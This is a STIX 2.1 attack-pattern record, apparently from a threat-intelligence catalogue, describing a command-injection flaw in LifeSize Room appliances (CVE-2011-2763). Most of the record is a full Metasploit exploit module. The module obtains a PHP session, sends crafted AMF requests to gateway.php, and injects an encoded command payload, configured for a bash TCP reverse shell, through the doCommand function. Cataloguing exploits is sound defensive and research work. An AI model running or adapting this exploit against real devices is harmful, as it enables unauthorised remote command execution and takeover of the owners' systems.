{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0badbdb2-7265-49cd-90e9-89fc25fa3927",
    "created": "2024-08-14T17:14:36.648233Z",
    "modified": "2024-08-14T17:14:36.648238Z",
    "name": "LifeSize Room Command Injection",
    "description": " This module exploits a vulnerable resource in LifeSize Room versions 3.5.3 and 4.7.18 to inject OS commands.  LifeSize Room is an appliance and thus the environment is limited resulting in a small set of payload options. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/lifesize_room.rb",
            "external_id": "lifesize_room.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2763"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LifeSize Room Command Injection',\n      'Description'    => %q{\n          This module exploits a vulnerable resource in LifeSize\n        Room versions 3.5.3 and 4.7.18 to inject OS commands.  LifeSize\n        Room is an appliance and thus the environment is limited\n        resulting in a small set of payload options.\n      },\n      'Author'\t=>\n        [\n          # SecureState R&D Team - Special Thanks To Chris Murrey\n          'Spencer McIntyre',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-2763' ],\n          [ 'OSVDB', '75212' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 65535,\t# limited by the two byte size in the AMF encoding\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic bash-tcp',\n            }\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [ [ 'Automatic', { } ] ],\n      'DisclosureDate' => '2011-07-13',\n      'DefaultTarget'  => 0,\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n    ))\n  end\n\n  def exploit\n    print_status(\"Requesting PHP Session...\")\n    res = send_request_cgi({\n      'encode'    => false,\n      'uri'       => \"/interface/interface.php?uniqueKey=#{rand_text_numeric(13)}\",\n      'method'    => 'GET',\n    }, 10)\n\n    if res.nil? || res.get_cookies.empty?\n      fail_with(Failure::NotFound, 'Could not obtain a Session ID')\n    end\n\n    sessionid = 'PHPSESSID=' << res.get_cookies.split('PHPSESSID=')[1].split('; ')[0]\n\n    headers = {\n      'Cookie'        => sessionid,\n      'Content-Type'  => 'application/x-amf',\n    }\n\n    print_status(\"Validating PHP Session...\")\n\n    data  = \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1b\"\n    data << \"LSRoom_Remoting.amfphpLogin\"\n    data << \"\\x00\\x02/1\\x00\\x00\\x00\"\n    data << \"\\x05\\x0a\\x00\\x00\\x00\\x00\\x00\\x17\"\n    data << \"LSRoom_Remoting.getHost\"\n    data << \"\\x00\\x02\\x2f\\x32\\x00\\x00\\x00\\x05\\x0a\\x00\\x00\\x00\\x00\"\n\n    res = send_request_cgi({\n        'encode'    => false,\n        'uri'       => '/gateway.php',\n        'data'      => data,\n        'method'    => 'POST',\n        'headers'   => headers,\n    }, 10)\n\n    if not res\n      fail_with(Failure::NotFound, 'Could not validate the Session ID')\n      return\n    end\n\n    print_status(\"Sending Malicious POST Request...\")\n\n    # This is the amf data for the request to the vulnerable function LSRoom_Remoting.doCommand\n    amf_data =  \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x19\"\n    amf_data << \"LSRoom_Remoting.doCommand\"\n    amf_data << \"\\x00\\x02\\x2f\\x37\\xff\\xff\\xff\\xff\"\n    amf_data << \"\\x0a\\x00\\x00\\x00\\x02\\x02#{[payload.encoded.length].pack('n')}#{payload.encoded}\"\n    amf_data << \"\\x02\\x00\\x0dupgradeStatus\"\n\n    res = send_request_cgi({\n        'encode'    => false,\n        'uri'       => '/gateway.php?' << sessionid,\n        'data'      => amf_data,\n        'method'    => 'POST',\n        'headers'   => headers\n    }, 10)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-13",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}